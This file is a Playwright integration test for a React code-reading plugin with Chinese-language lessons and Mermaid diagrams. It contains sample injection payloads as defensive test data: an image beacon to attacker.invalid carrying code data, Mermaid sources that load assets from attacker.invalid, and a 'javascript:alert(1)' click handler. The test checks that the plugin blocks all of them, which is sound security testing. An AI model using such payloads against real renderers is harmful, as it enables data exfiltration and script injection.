import { chromium } from 'playwright';
import { build } from 'esbuild';
import { readFile, mkdir, writeFile } from 'node:fs/promises';
import path from 'node:path';
import assert from 'node:assert/strict';

// Isolated component integration test. All HTTP is intercepted: this does not
// impersonate or replace the authenticated DSH shell at the existing GUI URL.
const output = path.resolve('.test-output/browser'); await mkdir(output, { recursive: true });
const bootstrap = await build({ stdin: { contents: `import React from 'react';import * as jsx from 'react/jsx-runtime';import {createRoot} from 'react-dom/client';window.React=React;window.createRoot=createRoot;window.slots={};window.__ModuleLoader__={load(row){window.plugin=row.factory(id=>{if(id==='react')return React;if(id==='react/jsx-runtime')return jsx;throw Error('Unexpected external '+id);});}};`, resolveDir: process.cwd(), loader: 'js' }, bundle: true, write: false, format: 'iife', platform: 'browser' });
const plugin = await readFile('lib/client.js', 'utf8');
const projectId = 'project-11111111-1111-4111-8111-111111111111';
const sessionA = 'reading-11111111-1111-4111-8111-111111111111'; const sessionB = 'reading-22222222-2222-4222-8222-222222222222';
const repoA = 'repo-11111111-1111-4111-8111-111111111111'; const repoB = 'repo-22222222-2222-4222-8222-222222222222';
const evidenceId = 'evidence-11111111-1111-4111-8111-111111111111'; const lessonId = 'lesson-11111111-1111-4111-8111-111111111111';
const repositories = [{ id: repoA, name: '订单仓库', root: 'D:\\fixtures\\orders' }, { id: repoB, name: '支付仓库', root: 'D:\\fixtures\\payments' }];
const project = { id: projectId, title: '订单与支付 · 组件测试', bindingRevision: 1, repositories, sessions: [{ id: sessionA, stage: 'call-chain', topic: '订单调用链', revision: 1, createdAt: '2026-01-01T00:00:00Z' }, { id: sessionB, stage: 'business', topic: '支付业务', revision: 1, createdAt: '2026-01-02T00:00:00Z' }] };
const evidence = { id: evidenceId, repoId: repoA, path: 'entry.ts', startLine: 1, endLine: 1, hash: '1'.repeat(64), symbol: 'submit', readAt: '2026-01-01T00:00:00Z' };
const lesson = { id: lessonId, title: '从下单到支付', stage: 'call-chain', topic: '订单提交', revision: 1, createdAt: '2026-01-01T00:00:00Z', markdown: `订单服务调用支付服务。\n\n[订单入口](evidence://${evidenceId})\n\n![不能外发](https://attacker.invalid/pixel?data=CODE)`, conclusion: '跨仓调用需要调用端与被调用端证据。', claims: [{ kind: 'fact', text: '入口调用提交方法。', evidenceIds: [evidenceId] }], nextQuestions: ['支付失败如何恢复？'], topics: [], mermaid: 'sequenceDiagram\n participant U as 用户\n participant O as 订单仓库\n participant P as 支付仓库\n U->>O: 下单\n O->>P: 请求支付\n P-->>O: 返回结果' };
const states = new Map([[sessionA, { stage: 'call-chain', topic: '订单调用链', revision: 1, modelSelection: { provider: 'remote', model: 'cloud-reader' } }], [sessionB, { stage: 'business', topic: '支付业务', revision: 1, modelSelection: { provider: 'local', model: 'private-reader' } }]]);
const requests = []; const external = []; const errors = [];
const browser = await chromium.launch({ executablePath: process.env.DSH_TEST_BROWSER ?? 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', headless: true });
try {
  const page = await browser.newPage({ viewport: { width: 1380, height: 1050 }, locale: 'zh-CN' }); page.on('pageerror', e => errors.push(e.message));
  page.on('request', request => { if (!request.url().startsWith('http://127.0.0.1:19387') && /^https?:/.test(request.url())) external.push(request.url()); });
  await page.route('**/*', async route => {
    const request = route.request();
    if (request.url() === 'http://127.0.0.1:19387/reading-component-test') return route.fulfill({ contentType: 'text/html', body: '<!doctype html><meta charset="utf-8"><style>html,body,#root{height:100%;margin:0;font-family:"Microsoft YaHei",system-ui}</style><div id="root"></div>' });
    if (!request.url().endsWith('/api/code-reading')) return route.abort();
    const body = request.postDataJSON(); requests.push(body); const p = body.params; let value;
    switch (body.method) {
      case 'list': value = { projects: [project], root: 'C:\\test-user\\.dsh\\code-reading', diagnostics: [] }; break;
      case 'models': value = { default: { provider: 'local', model: 'private-reader' }, groups: [{ id: 'local', name: '本地', models: [{ id: 'private-reader', name: 'Private Reader' }] }, { id: 'remote', name: '远程', models: [{ id: 'cloud-reader', name: 'Cloud Reader' }] }], failures: [] }; break;
      case 'snapshot': {
        const state = states.get(p.sessionId); assert.ok(state, 'known fixture session');
        value = { sessionId: p.sessionId, project, ...state, state: { id: p.sessionId, projectId, ...state, evidence: [evidence], lessons: p.sessionId === sessionA ? [lesson] : [], messageRefs: [], stageHistory: [] }, outputDirectory: `C:\\test-user\\.dsh\\code-reading\\projects\\${projectId}\\sessions\\${p.sessionId}`, messages: [], running: false, turnEnd: null, hasMoreMessages: false, archiveError: null }; break;
      }
      case 'stage': { const state = states.get(p.sessionId); assert.equal(p.expectedRevision, state.revision); Object.assign(state, { stage: p.stage, topic: p.topic, revision: state.revision + 1 }); value = state; break; }
      case 'files': value = { repoId: p.repoId, paths: ['entry.ts'], truncated: false }; break;
      case 'read': value = { evidence: { ...evidence, repoId: p.repoId }, lines: [{ number: 1, text: `export function submit() { return "${p.repoId === repoA ? '订单' : '支付'}"; }` }] }; break;
      case 'evidence': value = { evidence, stale: false, lines: [{ number: 1, text: 'export function submit() {}' }] }; break;
      case 'select-model': states.get(p.sessionId).modelSelection = { provider: p.provider, model: p.model }; value = { selected: states.get(p.sessionId).modelSelection }; break;
      default: value = {};
    }
    return route.fulfill({ contentType: 'application/json', body: JSON.stringify({ ok: true, value }) });
  });
  await page.goto('http://127.0.0.1:19387/reading-component-test'); await page.addScriptTag({ content: bootstrap.outputFiles[0].text }); await page.addScriptTag({ content: plugin });
  await page.evaluate(() => {
    const ctx = { effect: fn => fn(), uiWorkspace: { pickDirectory: async () => null }, slots: { inject: (_name, callback) => callback(), register: (options, component) => { window.slots[`${options.name}:${options.id ?? options.key}`] = { options, component }; return () => {}; } } };
    window.plugin.apply(ctx); window.testWorkspaces = []; window.selectedWorkspaceId = 'ordinary-initial'; window.readingRoot = window.createRoot(document.getElementById('root'));
    window.renderReadingPanel = () => { const slot = window.slots['main:code-reading']; window.readingRoot.render(window.React.createElement(slot.component, { ...slot.options.inject(), useWorkspaces: select => select({ items: window.testWorkspaces, selectedWorkspaceId: window.selectedWorkspaceId }) })); }; window.renderReadingPanel();
  });
  await page.getByText('从业务开始，逐步看懂代码').waitFor();
  assert.equal(await page.evaluate(() => window.slots['sidebar.panellist:code-reading'].options.label), '阅读代码');
  await page.getByRole('button', { name: /订单调用链/ }).click(); await page.getByRole('heading', { name: '从下单到支付' }).waitFor();
  await page.waitForFunction(() => document.querySelector('select[aria-label="阅读模型"]')?.value === 'remote\u0000cloud-reader');
  await page.frameLocator('iframe[title="Mermaid 调用链图"]').locator('svg').waitFor({ timeout: 30000 });
  assert.ok((await page.frameLocator('iframe[title="Mermaid 调用链图"]').locator('body').innerText()).includes('订单仓库'));
  await page.getByText('[图片未自动加载：不能外发]').waitFor(); assert.equal(external.length, 0);
  await page.getByRole('button', { name: /支付业务/ }).click(); await page.waitForFunction(() => document.querySelector('select[aria-label="阅读模型"]')?.value === 'local\u0000private-reader');
  await page.getByRole('button', { name: /订单调用链/ }).click(); await page.waitForFunction(() => document.querySelector('select[aria-label="阅读模型"]')?.value === 'remote\u0000cloud-reader');
  await page.getByRole('tab', { name: '代码与证据' }).click(); await page.getByRole('button', { name: '浏览文件' }).click(); await page.getByRole('button', { name: 'entry.ts', exact: true }).waitFor();
  await page.getByLabel('检索仓库').selectOption(repoB); await page.getByRole('button', { name: 'entry.ts', exact: true }).click(); await page.getByLabel('代码证据').waitFor();
  assert.equal(requests.filter(r => r.method === 'read').at(-1).params.repoId, repoA, 'file results keep their original repository identity after selector changes');
  await page.getByRole('button', { name: '2. 业务解释', exact: true }).click(); await page.waitForFunction(() => document.querySelector('[aria-current="step"]')?.textContent === '2. 业务解释');
  const malicious = ['flowchart TD\nA@{ img: "//attacker.invalid/leak?data=CODE", label: "x" }', 'flowchart TD\nclick A "javascript:alert(1)"', 'flowchart TD\nA[<img src="//attacker.invalid/x">]'];
  const rejected = await page.evaluate(async samples => { const results = []; for (const source of samples) { try { await window.plugin.renderDiagramDocument(source); results.push(false); } catch { results.push(true); } } return results; }, malicious);
  assert.deepEqual(rejected, [true, true, true]); assert.equal(external.length, 0); assert.deepEqual(errors, []);
  const otherTypes = ['flowchart TD\n A[下单] --> B[支付]', 'classDiagram\n class Order {\n +submit()\n }', 'stateDiagram-v2\n [*] --> Pending\n Pending --> Done\n Done --> [*]', 'erDiagram\n ORDER ||--o{ ITEM : contains'];
  const rendered = await page.evaluate(async samples => { const results = []; for (const source of samples) results.push((await window.plugin.renderDiagramDocument(source)).includes('<svg')); return results; }, otherTypes);
  assert.deepEqual(rendered, [true, true, true, true]);
  await page.getByRole('tab', { name: '知识点' }).click(); await page.getByRole('button', { name: '关闭证据' }).click();
  const goodDiagram = lesson.mermaid; lesson.mermaid = 'flowchart TD\n A -->'; await page.getByRole('button', { name: '刷新', exact: true }).click(); await page.getByRole('alert').filter({ hasText: 'Mermaid 无法渲染' }).waitFor(); assert.ok((await page.locator('.cr-diagram pre').innerText()).includes('A -->'));
  lesson.mermaid = goodDiagram; await page.getByRole('button', { name: '刷新', exact: true }).click(); await page.frameLocator('iframe[title="Mermaid 调用链图"]').locator('svg').waitFor({ timeout: 30000 });
  await page.evaluate(() => { window.testWorkspaces = [{ workspaceId: 'unrelated-workspace', title: '另一个普通工作区', path: 'D:\\unrelated-workspace' }]; window.selectedWorkspaceId = 'unrelated-workspace'; window.readingRoot.unmount(); window.readingRoot = window.createRoot(document.getElementById('root')); window.renderReadingPanel(); });
  await page.getByRole('heading', { name: '从下单到支付', exact: true }).waitFor(); await page.waitForFunction(() => document.querySelector('select[aria-label="阅读模型"]')?.value === 'remote\u0000cloud-reader');
  await page.getByRole('tab', { name: '代码与证据' }).click(); assert.deepEqual(await page.getByLabel('检索仓库').locator('option').evaluateAll(options => options.map(option => option.value)), [repoA, repoB]); assert.equal(requests.filter(request => request.method === 'snapshot').at(-1).params.sessionId, sessionA); await page.getByRole('tab', { name: '知识点' }).click();
  let archiveContentCheck = null;
  if (process.env.DSH_TEST_ARCHIVE_STATE) {
    const archive = JSON.parse(await readFile(process.env.DSH_TEST_ARCHIVE_STATE, 'utf8')); const archived = archive.lessons.at(-1); assert.ok(archived);
    const inlineCount = [...archived.markdown.matchAll(/^```mermaid[^\n]*\n([\s\S]*?)^```/gm)].length; assert.ok(inlineCount > 0);
    const original = { ...lesson }; const caption = `归档内容复验（隔离浏览器）：${archived.title}`;
    Object.assign(lesson, { title: caption, markdown: archived.markdown, conclusion: archived.conclusion, claims: [] }); delete lesson.mermaid;
    await page.getByRole('button', { name: '刷新', exact: true }).click(); await page.getByRole('heading', { name: caption, exact: true }).waitFor();
    assert.equal(await page.locator('iframe[title="Mermaid 调用链图"]').count(), inlineCount); await page.frameLocator('iframe[title="Mermaid 调用链图"]').first().locator('svg').waitFor({ timeout: 30000 });
    await page.screenshot({ path: path.join(output, 'archived-lesson.png'), fullPage: true }); archiveContentCheck = { passed: true, lessonId: archived.id, inlineDiagrams: inlineCount, environment: 'Actual archived Markdown rendered in isolated intercepted Chrome, not the authenticated GUI.' };
    Object.assign(lesson, original); await page.getByRole('button', { name: '刷新', exact: true }).click(); await page.getByRole('heading', { name: original.title, exact: true }).waitFor();
  }
  await page.frameLocator('iframe[title="Mermaid 调用链图"]').locator('svg').waitFor({ timeout: 30000 }); assert.equal(external.length, 0); assert.deepEqual(errors, []);
  await page.screenshot({ path: path.join(output, 'reading-panel.png'), fullPage: true });
  const report = { passed: true, environment: 'Isolated React component in Chrome; HTTP fixtures intercepted. Not the authenticated DSH shell.', checks: ['Native DSH Client factory/external-module contract', 'Sidebar entry and main slot', 'Mermaid sequence diagram rendered as sanitized sandbox SVG', 'Five diagram types and syntax-error source fallback', 'Markdown image cannot auto-load', 'Mermaid asset/click/HTML rejected before rendering', 'No unexpected HTTP requests or page errors', 'Restored session model overrides global default across switches', 'File-result repository identity survives selector changes', 'Human stage transition and revision update', 'Reading bindings and actual model survive ordinary workspace change and panel remount'], archiveContentCheck, externalRequests: external, pageErrors: errors };
  await writeFile(path.join(output, 'report.json'), JSON.stringify(report, null, 2)); console.log(JSON.stringify(report, null, 2));
} finally { await browser.close(); }
